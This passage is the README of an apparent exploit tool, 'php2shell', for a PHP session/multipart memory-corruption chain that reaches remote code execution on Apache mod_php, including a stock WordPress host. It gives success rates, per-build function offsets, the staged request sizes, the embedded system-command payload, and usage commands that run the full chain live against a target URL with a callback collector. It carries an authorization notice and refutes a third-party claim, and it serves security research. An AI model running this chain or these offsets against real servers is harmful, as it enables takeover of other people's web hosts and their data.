an INI-compatibility test on the upstream build, not an Arch package result
and not an Arch RCE.

Stock session ID parameters were `session.sid_length` /
`sid_bits_per_character` 26/5 on Amazon, 32/4 on Fedora and 26/5 on Alma; the
34/40-byte cookies are normal fresh IDs, not leaks.

**7.4/8.0 1,020-part multipart cap and FPM B1 gate (2026-10-23).** Debian 11 `7.4.33`
and Rocky 9.3 `8.0.30` report `max_multipart_body_parts=-1`, but both log
`Multipart body parts limit exceeded 1020` and truncate the large A1 bodies;
the 8.4 reference A1 geometry cannot be replayed unchanged on 7.4/8.0, and the
974-part sub-cap body did not OOM. Separately, raw FastCGI supplies
`CONTENT_LENGTH`, so the 33,128,677-byte B1 exceeds stock `post_max_size=8M`
and is rejected before session code runs on Debian 11/13.7, Rocky 9.3, Amazon
8.4.26 FPM, Fedora 44 and Alma 9.8 FPM. Those FPM B1 results are
transport-gated, **not valid negatives**; any prior 7.4/8.0 B1 negative based
on that body or on the 8.4 A1 geometry is likewise invalid. The Debian 11
mod_php `B1 0/5` and pinned single-child `0/3` are a **no B1 primitive** result
for the tested geometry, not evidence that 7.4 is fixed.

Positive control in the same run: official `8.4.26` mod_php reproduced the
full chain (A1 500, B1 819,208-byte leak, A2 500, B2 `uid=33(www-data)`), so
the distro negatives are measured against a working harness. None of the
tested distro packages in this sweep produced a full-chain RCE or an OOB
write; the vulnerable rows show only crash/DoS (mod_php A1/A2 OOM, Alpine 3.20
parse-phase OOM, 109618 worker SIGSEGV; FPM `exit 70`) or no primitive on the
tested geometry (Debian 11, Rocky 9.3, Amazon 8.4.26 B1, Alma 9.8 FPM). The
Amazon 8.4.26 109618 result is S1-only and no crash was treated as RCE. The
26.04 release B1 leak is heap-only with no `libphp`/`S` anchor, so no ASLR
break was obtained. The B1 body geometry is 8.4-derived, so a build-specific
leak offset cannot be excluded.

**Ubuntu 24.04/26.04 gap closure (2026-10-23).** Release `8.3.6`
(`8.3.6-0maysync1`) and `8.5.4-0ubuntu1` are crash/DoS-only: the Apache+FPM
Content-Length 109618 body returns HTTP 200 empty, OOM 12,288 B, FPM child
exit 70, no SIGSEGV, next GET 200; the CL A1 OOM 4,096 is logged; nginx
64 MiB A1 loses one child (exit 70) per request. Fixed
`8.3.6-0ubuntu0.24.04.13` and `8.5.4-0ubuntu1.5` return 200 `OK` for the
14,497,878 B chunked body with the PHP warning `Actual POST length does not
match Content-Length, and exceeds 8388608 bytes` and no OOM. No RCE, OOB write,
or proof was obtained; the release rows are ❌ with a crash/DoS-only blocker. No
ASLR break and no `/tmp/dc_*` proof file on any target.

Debian-family packages use a different geometry from upstream: `fillers=116`
and `S=main+0xF7398` (upstream: `fillers=115`, `S=main+0xF8398`).
`zif_system`/`zval_ptr_dtor` also move per build: Debian 13 8.4.24 is
`0x24cdd0`/`0x424ff0`, Ubuntu 25.04 8.4.5-1ubuntu1.2 is
`0x245810`/`0x424fc0`; both keep `PS(id)=ps_globals+0x10`. Do not transplant
offsets between builds.

### WordPress 7.1.3 + Apache mod_php (stock)

This is the audited stock-compliant WordPress ✅ cell (2026-10-23 audit;
2026-10-24 pure-HTTP pin): Debian 13.7 Apache 2.4.69 prefork + mod_php 8.4.24,
stock MPM and stock package INI, official WordPress 7.1.3 core file,
target-written proofs. It is direct Apache mod_php only; it does not extend to
nginx/FPM.

The WordPress 7.1.3 rows in the Applications table that target
`/wp-content/index.php` use a core silence file; WordPress is not bootstrapped,
so those results are engine-level, not an app-level WordPress RCE.

| Condition | Audited value |
|---|---|
| OS / package | Debian 13.7 (trixie); `libapache2-mod-php8.4 8.4.24-1~deb13u1`; `apache2 2.4.69-1~deb13u1` |
| SAPI | `mpm_prefork_module` + `php_module` (mod_php); no FPM, no proxy |
| MPM | stock `StartServers 5`, `MinSpareServers 5`, `MaxSpareServers 10`, `MaxRequestWorkers 150`, `MaxConnectionsPerChild 0`; no config-level worker pinning, no custom MPM, no `mod_unique_id`, no restart/kill; the 2026-10-24 pure-HTTP pin uses 149 half-open POST holders (HTTP-only pool exhaustion) |
| php.ini | stock package conffile, `dpkg -V` clean: `post_max_size=8M`, `memory_limit=128M`, `display_errors=Off`, `output_buffering=4096`, `expose_php=Off`, `upload_max_filesize=2M` |
| ASLR | `randomize_va_space=2` |
| Endpoint | `/wp-content/index.php`, official 28-byte core file, mode 644; MD5 `67442c5615eba73d105c0715c6620850`, SHA-256 `bd48c24ce4500e60d2524571756787283f0d3fbfa50b116331309c09773f0cd1` |
| Docroot | official WordPress 7.1.3 ZIP (`eb58a90ed55147f90f7bd55d0d3334960a69b7e8a4cc142c8ddfea8965218227`) minus 48 inactive bundled files (47 `wp-content/plugins/akismet/*` + `wp-content/plugins/hello.php`), plus default `wp-config.php` byte-identical to `wp-config-sample.php`; 3,735 files / 109,646,539 B; no plugins (only the official 28-byte `wp-content/plugins/index.php`), no uploads, no mu-plugins, no `.htaccess`, no `.user.ini` and no lab endpoints; mounted read-only |
| Integrity | pre/post manifest identical; `docker diff` clean under `/var/www/html`; read-only `touch` fails; target hash unchanged |

The endpoint is a standalone silence file. It does not load `wp-config.php`,
plugins or themes, so this is a SAPI/heap primitive on an official core file,
not an application LFI, upload or docroot-write chain.

**Request stages.** A1 993,911 B and B1 33,128,677 B are chunked
(`Transfer-Encoding: chunked`, no `Content-Length`); A2 279,432 B and B2
451,384 B are plain. The stock Apache `LimitRequestBody` default (1 GiB)
admits B1. The stock `post_max_size=8M` gate is driven by a declared length:
the same 33,128,677-B body with `Content-Length: 33128677` returns 200/166 B
and logs `POST Content-Length of 33128677 bytes exceeds the limit of 8388608
bytes`, while the chunked B1 reaches PHP and leaks. The INI is not raised;
only the chunked/no-`Content-Length` path bypasses the gate (a proxy that
buffers and supplies `Content-Length` re-imposes it). A2 is 279,432 B; B2 is
451,384 B (the 451,384-B stage is B2, not A2).

**Pure-HTTP pin (2026-10-24).** Two independent full chains (`C1`, `C2`) on the
stock package wrote target-owned `uid=33(www-data)` on B2 attempt 0, and a
leak-only run (`L1`) reproduced; the 149 half-open POST holders are sockets-only,
with no `%P`, `/proc`, gdb, local process control or fresh-child swap. The old
`cell.py`/`driver.py` capped-pool harness is gone from the execution path
(historical files archived, not deleted). B1 remains a 33,128,677 B chunked
request (decoded leak 819,208 B); this is direct Apache prefork mod_php, not
nginx or FPM. Stock nginx 1 MiB rejects B1 with 413 and its buffering re-arms
`post_max_size=8M`.

**Target-written proofs.** The 2026-10-23 audit counted four proofs: `MW001`
and `MW006` (Protocol A), `PR001` and `PR002` (Protocol B); the 2026-10-24
pure-HTTP runs add `p1_C1` and `p1_C2` (57 B each). Each `/out/p1_<marker>` contains
`uid=33(www-data) gid=33(www-data) groups=33(www-data)` and the marker. The
host owner is `100032:100032`, the rootless-Docker mapping of container
`33:33` (`/proc/self/uid_map`: `1 -> 100000`, so `33 -> 100032`); the driver
only unlinks/reads the proof path. B2 embeds
`id>/out/p1_<marker>;echo <marker>>>/out/p1_<marker>;id>&2;echo <marker>&2`
and executes `zif_system`; the proof-writing child then dies with SIGSEGV
(11), the client sees status 0, and the error log records the child signal.
No 200/500, OOM or crash is counted as RCE.

**Rate caveat.** The clean blind stock series is Protocol A **2/20 = 10.0%**
(Wilson 95% CI 2.8–30.1). Protocol B is also 2/20, but its driver derives the
attempt width from a worker-count observation (`docker exec ps`), so the
pooled **4/40 = 10.0%** (95% CI 4.0–23.1) is lab-assisted, not fully blind;
do not quote 4/40 as a blind rate. The primitive is stochastic and needs
retries: A1 must be followed by a B1 that reaches the same child, and a child
that has already served a B1 is no longer a reliable A1 target. The
same-container A→B control was 2/40 = 5.0% (1.4–16.5) because the B phase
began on a fully polluted pool; a fresh-pool B-first series produced 2/20. The
2026-10-24 pure-HTTP pin removes the same-child lottery for the pinned path
(2/2 full chains on B2 attempt 0); the rates above describe the un-pinned
multi-worker audit, not the pinned path.

**Scope.** Direct Apache mod_php only. Stock nginx/FPM and MediaWiki remain
❌/gaps; nginx-proxied mod_php, lsphp/LSAPI and other SAPIs are unchanged.
There is no application LFI or upload: B2 has no `filename=` parts and the
only target-side write used for success is `/out/p1_<marker>` via the
same-chain B2 `zif_system` payload; the docroot is never written. `p2s` is a
lab-added logging-only `LogFormat` (`%P ...`), not a stock Apache format; it
is not part of the exploit path.

### Applications

| App / version | PHP + SAPI | Endpoint / config | Status | Class / qualifier |
|---|---|---|---|---|
| WordPress 7.1.3 | Apache 2.4.69 prefork + mod_php 8.4.24 (Debian 13.7 `8.4.24-1~deb13u1`) | stock prefork 5/150; `/wp-content/index.php` 28-B core file; official docroot minus inactive bundled plugins, read-only | ✅ | **stock-compliant**: stock PHP/Apache/docroot defaults; core silence file; WordPress not bootstrapped; direct mod_php; target-written `MW001`/`MW006`/`PR001`/`PR002`; pure-HTTP 149 half-open pin 2/2 full chains + 1/1 leak-only (`C1`/`C2`/`L1`, B2 attempt 0); blind 2/20, pooled 4/40 lab-assisted in the un-pinned audit; see section above |
| WordPress 7.1.3 | 8.4.26 mod_php | `/wp-content/index.php` (silence file) | ✅ | engine-level; 2/2 on the official core file and 2/2 on a plain PHP file under the stock docroot, target-written `uid=33(www-data)`; prior audit 3/60 blind on the 993,911-B A1 shrink (first 3/3; post-first 0/57); WordPress not bootstrapped; php.ini-production mounted; G51 is scoped to 8.4.26 and its stock-file/docroot sub-question is resolved; a WordPress-bootstrap cell is still untested |
| WordPress 7.1.3 | Apache 2.4.69 prefork + mod_php 8.4.27 (stock upstream `php:8.4.27-apache`, Debian 13.7) | stock prefork 5/150 (observed 5→15); `/wp-content/index.php` 28-B core file, read-only | 🚫 | fixed upstream in 8.4.27; A1 200/256 B no OOM; B1 0/20 multi-worker + 0/10 single-worker; A2 200/192 B; B2 unreachable (no B1 leak); per-build only, no range extrapolation |
| WordPress 7.1.3 | 8.4.26 nginx+mod_php non-stock | `/index.php` front controller | ✅ | engine-level; 6/6 OOB; pre-app — WP not installed (`mysqli` missing), HTTP 500 |
| WordPress 7.1.3 | 8.4.26 nginx+mod_php non-stock | `/wp-content/index.php` | ✅ | engine-level; non-stock 64M; 6/6 |
| WordPress 7.1.3 | 8.4.26 FPM | `/index.php` | ❌ | multipart OOM only (502/exit 70) |
| WordPress 7.1.3 | 8.5.11 FPM | `/index.php` | ❌ | OOM only |
| WordPress 7.1.3 | 8.3.35 FPM | `/index.php` | ❌ | FPM only: OOM only; the 8.3.35 mod_php result does not extend to FPM |
| Roundcube 1.7.5 | 8.4.26 FPM | **stock DB-session row** (`session_storage=db`); nginx 1m/25m/64m; `/` and `/static.php` | ❌ | no chain/RCE; DB sessions, kept separate from the explicit file-session row below; `/static.php` allowlisted but still enters PHP; `PHPSESSID` POST ignored; A1 at 128M exits 70, no session file; B1 no leak; stock 1 MiB 413; 25/64M still no leak |
| Roundcube 1.7.5 | 8.4.26 nginx+FPM | **explicit file sessions** (`session_storage=php`, `/tmp/sess_<id>`) | ❌ | app session 490 B; A2 adds 515-B `upload_progress_k0`; `PHPSESSID` variant merges progress + app keys to 1,005 B; B1/B2 normal pages only (5,400 B; `/static.php` 387,438 B JS); no leak; no auth bypass; **B1 leak/address recovery blocker** |
| Nextcloud 35.0.2 | 8.4.26 FPM | docs 10G/512M; 10G/128M | ❌ | no chain/RCE; documented 512M stack removes OOM; 10G/128M A1 exits 70, no session file; B1 no leak |
| Drupal 11.4.11 | 8.5.10 FPM (lab build) | file sessions + `.user.ini` + 2M + `static1` | ✅ | app-assisted, **not stock**; 3/3 fresh ASLR |
| Drupal 11.4.11 | 8.4.26 FPM | 64M; stock DB sessions | ❌ | no chain/RCE; 64M A1 exits 70, no session file; B1 no leak |
| Drupal 10.6.20 | 8.4.26 nginx+FPM | native PHP files (`/tmp/sess_<id>`, 175 B) | ❌ | no `sessions` table (75-table SQLite); login 303 → 175-B file (mode 600); A1/A2 502/`exit 70` once nginx admits (A1 OOM 4,096 B, A2 OOM 20,480 B, `Unknown on line 0`); B1/B2 normal; no leak; no auth bypass; **B1 leak/address recovery blocker** |
| Drupal 10.6.20 | 8.3.26 nginx+FPM | native PHP files (48-char SID) | ❌ | same A1/A2 502/`exit 70`; 175-B login file; B1/B2 normal; no leak; **B1 leak/address recovery blocker** |
| Drupal 10.6.20 | 8.4.27 nginx+FPM | native PHP files | 🚫 | fixed control: A1/A2/B1/B2 all 200; no OOM, no `exit 70`, no leak; 175-B file intact |
| Joomla 5.4.10 | 8.5.10 FPM (lab build) | file sessions + 2M + `cleanup=0` | ✅ | app-assisted, **not stock** |
| MediaWiki 1.46.2 | 8.4.26 FPM | `/index.php` | ❌ | OOM only |
| MediaWiki 1.46.2 | 8.5.11 FPM | `/index.php` | ❌ | OOM only |
| MediaWiki 1.46.2 | 8.3.35 FPM | `/index.php` | ❌ | OOM only |
| Moodle 5.0.10 | 8.5.11 FPM | normal request | ❌ | fresh serializer at RINIT |

App controls (2026-10-23 file-session run): Drupal wrong password returned
200/18,778 with no 303 and no `Set-Cookie`; anonymous `/user/1` and `/admin`
were 403. A valid Drupal login (303 → `/user/1?check_logged_in=1`, 175-B file)
survived A1→B1→A2→B2: `/user/1` remained 200 with "Log out" and B1 returned
302 instead of a login page. Roundcube wrong login returned 401/5,515 with a
valid CSRF token and 401/5,498 without; `?_task=mail` rendered the login form;
the DB has 0 users. **No authentication bypass was observed on either app.**

PHP 8.4.27 at 64M returned 200 for A1/A2/B1/B2 on the Drupal/diag vhosts
with no OOM and no `exit 70`; disabling `session.upload_progress` on 8.4.26
moved A1's failure to an app-level 500 (worker survives), but A2 still exited
70 and no B1 leak appeared. The full A1→B1→A2→B2 sequence returned normal
B1/B2 pages. The app rows above therefore show reachability and availability
failures, not a memory-corruption primitive.

**Drupal 10.6 file-session root cause.** `Drupal\Core\Session\SessionHandler`
extends `AbstractProxy`; Symfony only wraps/registers a non-`AbstractProxy`
handler or a `SessionHandlerProxy`, so `session_set_save_handler()` is never
called and PHP's native `files` handler stays active. The installed 10.6.20
SQLite has 75 tables and no `sessions`; login writes a 175-B
`/tmp/sess_<id>` (mode 600). Drupal 11.4.11 extends `AbstractSessionHandler`,
is wrapped, and uses the `sessions` table - hence the separate DB row.

**Body-limit boundary.** 113 matrix cases were executed and 112 are valid;
the one invalid case is `ctrl_noprogress_a1`, a `/info.php` request sent to the
Roundcube-rooted port 19910 (404/153 B, wrong document root). It never reached
PHP, is flagged `valid:false`, and is excluded from every count and from the
evidence. Roundcube on 8.4.27 is `—` not tested (not rebuilt).

| Body (bytes) | stock 1 MiB | 25 MiB | 64 MiB |
|---|---|---|---|
| A1 (1,060,211) | 413/183 | 502/157 `exit 70` | 502/157 `exit 70` (8.4.27: 200) |
| A2 (279,369) | 502/157 `exit 70` | 502/157 `exit 70` | 502/157 `exit 70` (8.4.27: 200) |
| B1 (33,128,677) | 413/183 | 413/183 | 200 normal |
| B2 (451,384) | 200 normal | 200 normal | 200 normal |

The stock 1 MiB cap blocks **A1 and B1 only**; A2/B2 fit and still exercise the
engine. 25 MiB admits A1/A2/B2 but **not B1**; only 64 MiB admits all four.
A1 OOMs allocating 4,096 B and A2 20,480 B, both in `Unknown on line 0`;
8.4.27 removes the OOM and `exit 70` on the Drupal/diag vhosts.

### Other CVEs

| CVE | Builds | Config | Status | Class / result |
|---|---|---|---|---|
| CVE-2026-115560 | 8.4.26 / 8.5.11; mod_php + FPM | `cleanup=0`, app gadget, `php_binary`/`php_serialize` → `php` | ✅ | app-gadget RCE; no memory corruption; ASAN/LSan clean |
| CVE-2026-115560 | stock `cleanup=1` | stock | ❌ | poisoned record deleted before app code |
| CVE-2026-115560 | 8.5.12 / 8.4.27 / 8.3.36 / 8.2.35 | `cleanup=0` | ✅ | still reproduces; 109618/109619 fixes do not address this CVE |
| CVE-2026-6722 | 8.4.20 / 8.5.5; SOAP | mod_php | ❌ | unauthenticated remote DoS, no RCE; handlers call primitive, no ASLR bypass |
| CVE-2026-6722 | 8.4.21 / 8.5.6 | mod_php | 🚫 | fixed |
| CVE-2019-11043 | 7.1.32 / 7.2.23 / 7.3.10; FPM | nginx with path-info config | ✅ | config-induced RCE |
| CVE-2019-11043 | same | stock Debian/WordPress/MediaWiki config | ❌ | blocked |
| CVE-2019-11043 | 7.1.33 / 7.2.24 / 7.3.11; FPM | fixed | 🚫 | fixed |

**Third-party 8.3.35 claim — failed verification (2026-10-24).**
`Percivalll/php2shell-wordpress-rce` is an original third-party repository,
static-review clean and not malicious. Four static offsets match our
`php:8.3.35-apache` build and its Apache 2.4.68 differs from our 2.4.69 only by
minor version, but its exact HTTP RCE chain was independently reimplemented and
tested on the stock image: **❌ no RCE, no target-written marker, no `uid`**;
`/var/www/html/pwn.txt` and `/tmp/ran.txt` are absent. The underlying
stale-session OOB read is real with our own A1/B1 pair: 1,169,024 B (`0x11d680`)
returned in `Set-Cookie`; the libphp base is recoverable from 584 leaked
`zval_ptr_dtor` pointers; 8.3.36 does not reproduce it; stock nginx 1 MiB
returns 413 for A1/B1 before PHP. The exact chain fails at four points: (1) its
`build_a()` places the session fields and file part after ~66 MB of fillers, so
on stock 128M it OOMs after 852 FORMDATA callbacks before `FILE_START`, never
runs `php_session_initialize()`, leaves no stale `PS(id)`, and B gets a fresh
cookie; (2) its 63-byte forge does not produce the claimed 4 KiB window and,
after our A1, corrupts the Zend heap (`zend_mm_heap corrupted`, SIGABRT); (3)
`raw[0x6c8] - 0x50ddbf` is invalid in our capture (`raw[0x6c8]` is `A`×8; the
parser's best vote is 1 < 4), and `H = chunk+0x6a000` is unvalidated; (4)
without a controlled base/chunk/H, the `ps_serializer` write and `zif_system`
call were not reached. The claimed 4 KiB leak / fake `ps_serializer` nginx
bypass is **false/unverified**; the 1.17 MB OOB read is direct-Apache only and
too large for the default nginx `proxy_buffer_size`. The 8.3.35 ✅ above is our
own verified blind chain, not this repository's primitive. Repository claim:
`❌` tested, not reproduced.

### Coverage gaps

50 numbered entries; every row is `—` (no qualifying RCE or untested), never ❌.

| ID | Status | Lane | Untested cell | Existing evidence / note | Priority |
|---|---|---|---|---|---|
| G01 | — | Distro | Debian 12 `8.2.32` + mod_php (other 8.2.x untested) | tested ❌; A1/A2 500 parse-OOM, 0/13 B1 leaks (34 B); B1 blocker, not an offset miss | P0 |
| G02 | — | Distro | Debian 12 `8.2.x` + FPM | 8.2.32 FPM: A1/A2 502, 2 exit-70, no B1 leak; other 8.2.x untested | P0 |
| G03 | — | Distro | Debian 13 `8.4.24-1~deb13u1` + FPM | mod_php tested, including the stock multi-worker WordPress 7.1.3 cell; FPM not run | P1 |
| G04 | — | Distro | Ubuntu 20.04 `7.4.3` + mod_php | upstream 7.4.33 | P2 |
| G05 | — | Distro | Ubuntu 20.04 `7.4.3` + FPM | upstream 7.4.33 | P2 |
| G06 | — | Distro | Ubuntu 22.04 pre-update `8.1.2` + mod_php | tested ❌; A1/A2 500 parse-OOM, 0/13 B1 leaks; fixed at `8.1.2-1ubuntu2.28` | P0 |
| G07 | — | Distro | Ubuntu 22.04 `8.1.2` + FPM | base FPM: A1/A2 502, 2 exit-70, no B1 leak; fixed at `.28` | P0 |
| G08 | — | Distro | Rocky Linux 9.3 `8.0.30-8.el9_8.1` FPM only | tested ❌; no mod_php/`libphp`; A1/A2 200; 33 MB B1 rejected by stock `post_max_size=8M`, so B1 is not a valid negative | P1 |
| G09 | — | Distro | FPM B1 on Debian 11.11 / 13.7, Rocky 9.3, Amazon 2023.12, Fedora 44 and Alma 9.8 | 33 MB body rejected by stock `post_max_size=8M` before session code; A1-only, not a valid B1 negative; needs sub-8M B1 or declared larger limit | P1 |
| G10 | — | Distro | PHP 7.4/8.0 B1 negatives (Debian 11, Rocky 9.3) | 1,020-part multipart cap despite `max_multipart_body_parts=-1`; 8.4 reference A1 geometry truncated, so prior B1 negatives for those builds are invalid | P0 |
| G11 | — | Distro | Debian 11 `7.4.33` sub-1,020-part A1 tuning | 974-part body 200/no OOM; a 7.4-specific A1 geometry was not searched; no claim of 7.4 safety | P1 |
| G12 | — | Distro | Arch Linux rolling `8.5.12-1` / `php-legacy 8.3.36-1` | fixed metadata only; no local image/rootfs; repos ship 8.5.12/8.3.36 and no 8.4.26; Arch-INI transplant is not an Arch package result; **not package-tested** | P2 |
| G13 | — | Distro | Alpine edge | fixed metadata only (8.4.27/8.5.12/8.3.36); no native install or chain test | P3 |
| G14 | — | Distro | Amazon Linux 2023.12 `php8.4-modphp 8.4.26` A1 exact onset | onset between 860 and 870 big-value parts; reference 974-part body 200; boundary not bisected | P1 |
| G15 | — | Distro | Amazon Linux 2023.12 `php8.4-modphp 8.4.26` B1 build-tuned read spec | 0/5 stock and 0/5 pinned single-child is the 8.4-derived geometry; no leak, no B2 | P1 |
| G16 | — | Distro | Amazon Linux 2023.12 `php8.4-modphp 8.4.26` A2/B2 | A2 sent on FPM only (OOM 20,480 B), not on mod_php; B2 unreachable without a B1 leak | P1 |
| G17 | — | Distro | Amazon Linux 2023.12 `php8.4-modphp 8.4.26` 109618 S2 band | S1 at H=427343; 38 H points total, 33 below S1; S2 not observed, 0 SIGSEGV/AH00052 | P1 |
| G18 | — | Distro | Amazon Linux 2023.12 `php8.3.36` / `8.5.12` live | repo version/file-list metadata only; no chain test | P3 |
| G19 | — | Distro | Fedora 44 `php-fpm 8.5.12-1.fc44` 109618 producer | fixed build, not exercised; A1/A2 200, B1 8M-gated | P3 |
| G20 | — | Distro | B2 on any distro package | requires a B1 leak plus per-build offsets; no B2 attempted on Amazon/Fedora/Alma | P1 |
| G21 | — | Build | FPM `8.2.35` fixed control | runtime: A1/A2 200, 0 exit-70; no qualifying RCE | P0 |
| G22 | — | Build | FPM `8.4.27` fixed control | source only | P1 |
| G23 | — | Build | mod_php `8.4.9` | absent upstream: no release, official image or ChangeLog entry; only an abandoned pre-publication CDN tarball; not a vulnerable/fixed cell | P2 |
| G24 | — | Build | mod_php `8.4.0` | absent upstream: no release, official image or ChangeLog entry; only an abandoned pre-publication CDN tarball; not a vulnerable/fixed cell | P2 |
| G26 | — | Build | 5.6.0 / 7.0.0 / 7.1.0 runtime | tips only | P3 |
| G27 | — | SAPI/OS | nginx+mod_php `8.4.10` | mod_php warm chain | P2 |
| G28 | — | SAPI/OS | nginx+mod_php `8.4.20` | mod_php warm chain | P2 |
| G29 | — | SAPI/OS | nginx+mod_php `8.5.11` | mod_php leak only | P2 |
| G30 | — | SAPI/OS | direct FastCGI full chain `8.4.26` / `8.5.11` | framing tests only | P3 |
| G31 | — | SAPI/OS | FreeBSD 13/14 + Apache + mod_php (ports) | build-specific offsets | P2 |
| G32 | — | SAPI/OS | FreeBSD 13/14 + nginx + FPM (ports) | build-specific offsets | P2 |
| G33 | — | SAPI/OS | Windows Server + IIS 10 + FastCGI (8.3/8.4/8.5 NTS) | no Windows host available; no FPM on Windows; no chain attempted | P2 |
| G34 | — | SAPI/OS | Windows + Apache + mod_php | no Windows host available; optional | P3 |
| G35 | — | App | WordPress 7.1.3 installed with `mysqli`/DB | core-file stock cell tested; installed `/index.php` front controller still 6/6 pre-app; tree was 500/no DB | P1 |
| G36 | — | App | WordPress 7.1.3 nginx+FPM full chain | only FPM OOM/`exit 70`; stock nginx 1 MiB and FPM `post_max_size=8M` gate B1; no stock nginx+FPM chain | P1 |
| G37 | — | App | WordPress 7.1.3 mod_php 8.3.35 / 8.5.11 | 8.3.35 tested engine-level on the official core file (mod_php row); 8.5.11 untested | P2 |
| G38 | — | App | Drupal 11.4.11 **stock** DB sessions | tested ❌ at 8.4.26 FPM 64M; A1 exit-70, no B1 leak; Drupal 10.6 file-session rows are in Applications | P1 |
| G39 | — | App | Joomla 5.4.10 **stock** DB sessions | lab file-session only | P1 |
| G40 | — | App | Joomla 6.2.0 | none | P2 |
| G41 | — | App | MediaWiki 1.46.2 mod_php / other FPM | FPM OOM only | P2 |
| G42 | — | App | Laravel 13 | none | P1 |
| G43 | — | App | Symfony 8.1 | none | P1 |
| G44 | — | App | Roundcube 1.7.4 | 1.7.5 tested ❌ (stock DB and explicit file sessions, no B1 leak); 1.7.4 not run | P0 |
| G45 | — | App | Nextcloud 35 | 35.0.2 tested ❌ (512M no OOM, 128M exit-70, no B1 leak); 34/33 in G49 | P1 |
| G46 | — | App | phpMyAdmin 5.2.3 | none | P2 |
| G47 | — | App | Magento 2.4.9 | optional | P3 |
| G48 | — | App | OpenCart 4.x | optional; version unverified | P3 |
| G49 | — | App | Laravel 12 / Symfony 7.x/6.4 / Nextcloud 34/33 | secondary versions | P3 |
| G50 | — | SAPI/OS | OpenLiteSpeed 1.9.3 + lsphp `8.5.11` (LSAPI) | no exact local `lsphp85` build or LSAPI-specific trigger; upstream `sapi/litespeed/lsapi_main.c` has the same early return at `php_request_startup()` failure, so expected 500/exit 255, not a shutdown crash; **not measured**; `—`, not ❌ | P1 |
| G51 | — | App | WordPress 7.1.3 + upstream `php:8.4.26-apache` stock multi-worker | 8.4.26 only; stock-file/docroot sub-question resolved by measurement (official WP core file 2/2 and plain PHP 2/2, engine-level); WordPress not bootstrapped, so a stock multi-worker WordPress-bootstrap cell remains untested; no claim for other builds | P1 |

The tested stock WordPress-on-Apache cell is no longer a gap. The remaining
WordPress cells are the installed front controller (G35), stock nginx+FPM
(G36) and the WordPress-bootstrap sub-question of upstream 8.4.26 (G51,
scoped to 8.4.26 only).

No evidence artifacts (receipts, bodies, binaries, dumps or per-run reports)
are shipped in this repository; only the tool, its offset profiles and this
document are.

## Layout

| path | contents |
|---|---|
| `tool/php2shell.py` | chain driver (`recon`, `producer`, `write_stage`, `leak`, `g2`, `chain`) |
| `tool/debian8424.py` | standalone Debian 13 `libapache2-mod-php8.4` 8.4.24 four-stage runner (A1→B1→A2→B2); dry by default |
| `tool/phpcheck.py` | passive PHP version/build CVE candidate checker; no exploit traffic |
| `tool/run` | POSIX shell wrapper: `./tool/run --help` |
| `tool/modules/` | request/producer builders, chain stages, per-build profiles (see `tool/modules/README.md`) |
| `tool/stages/` | fingerprint and probe stage |
| `addresses/` | per-build offset profiles loaded by `g2_chain.py` and `leak_stage.py` |

`addresses/g2_fpm_*.json` are runtime inputs for `--step g2` and
`addresses/apache_libphp.json` for `--step leak`; without them those steps
cannot resolve a build.

## Requirements

- Python 3.8 or newer, standard library only (no third-party packages).
- A POSIX shell for `tool/run`.

There is nothing to install; `requirements.txt` is intentionally empty apart
from a comment.

## Usage

```sh
./tool/run --help

# read-only fingerprint/probe against a registered target
./tool/run --target wiki --step recon

# send a producer payload to an explicit target
./tool/run --target wp --step producer --body-bytes 5700000

# mod_php end-to-end chain (ordered producer + consumer sequence)
./tool/run --target modphp --step chain --url http://127.0.0.1/ --command id

# offline FPM G2/G6 record plan from explicit addresses (no transport)
./tool/run --step g2 --g2-profile 8.5.10 --g2-decode zif_system \
    --g2-x 0x7f0000000000 --g2-x2 0x7f0000001000 --g2-p 0x7f0000002000 \
    --g2-b0 0x7f0000003000
```

Steps: `recon` (read-only receipt), `producer` (send a producer payload),
`write_stage` (build the final forged multipart, no send), `leak` (mod_php
calibration plan, no transport), `g2` (offline FPM G2/G6 record plan, no
transport), `chain` (mod_php ordered chain; FPM targets use the legacy
blocker-hold + rearm + forged staged multipart).

Registered targets and per-build constants live in `tool/modules/profiles.py`.
Receipts are written under `files/io/` by default and are git-ignored.

### Debian 13 mod_php 8.4.24 four-stage runner

`tool/debian8424.py` is a separate, research-derived runner for the exact
Debian package `libapache2-mod-php8.4 8.4.24-1~deb13u1`. It is deliberately
not a `--profile` entry and does not change the existing `--step chain`
semantics. The target shape is prefork mod_php with
`output_buffering=4096` and a 22-byte PHP endpoint
(`<?php echo "OK\n"; ?>`); the package must match, because the constants are
build-specific.

Dry-run is the default and sends no traffic; `--live` sends one exact
A1 → B1 → A2 → B2 sequence. A1/B1/A2/B2 are 1,060,211 / 33,128,677 /
279,432 / 451,384 bytes and are hash-checked before sending. The stock
multi-worker audit above used a separate driver and the 993,911-B A1 shrink;
this runner keeps the 1,060,211-B A1 and does not implement multi-worker pool
sampling.

```sh
# offline: generate and verify bodies, no socket
python3 -m tool.debian8424 --url http://127.0.0.1:8080/ --dry-run

# live, with a built-in loopback HTTP callback collector
python3 -m tool.debian8424 --url http://127.0.0.1:8080/ \
    --command id --lhost 127.0.0.1 --lport 9001 --timeout 180 \
    --output files/io/debian8424-run1 --live
```

Use `--callback http://HOST:PORT` with `--callback-log FILE` for an external
collector, or `--proof-file PATH` / `--error-log PATH` when the runner shares
the target filesystem (bare-metal local use). Success is reported only when
the marker is observed through one of those channels; an HTTP 200/500 response
alone is not success. There is no `docker exec` and no container-filesystem
read. B1 is probabilistic, and the B2 command must fit the 200-byte `ht`
carrier.

### Passive version/build checker

`tool/phpcheck.py` maps a PHP version (optionally with a distro package
revision) and SAPI to CVE-2026-109618/109619 candidate status. It sends no
exploit traffic: without `--url` it is offline, and `--url` performs one
unauthenticated GET and reads response headers only. Requires Python 3.10 or
newer.

```sh
python3 tool/phpcheck.py --version 8.4.24 --sapi mod_php
python3 tool/phpcheck.py --package 'libapache2-mod-php8.4=8.4.24-1~deb13u1' \
    --distro debian13 --sapi mod_php --json
python3 tool/phpcheck.py --list-cves
```

`VULNERABLE-CANDIDATE` is a lead, not proof: pass `--package`/`--distro` for
build identity and verify the listed conditions separately.

## Scope and authorization

Use only against systems you own or are explicitly authorized to test. The
tool sends malformed multipart bodies that can crash or exhaust PHP workers by
design.

## License

AGPL-3.0; see `LICENSE`.
